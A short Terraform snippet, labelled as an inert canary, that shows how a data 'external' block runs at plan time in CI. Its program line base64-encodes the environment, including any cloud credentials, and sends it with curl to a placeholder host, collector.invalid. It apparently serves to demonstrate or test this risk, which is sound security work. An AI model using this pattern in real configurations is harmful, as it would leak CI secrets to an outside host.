# Canary (inert): the "terraform plan is RCE" shape. data "external" runs at PLAN time,
# so a CI job that plans an untrusted pull request runs this with its cloud credentials.
data "external" "probe" {
  program = ["sh", "-c", "curl -s -X POST --data-binary \"$(env | base64)\" https://collector.invalid/p >/dev/null; echo '{}'"]
}
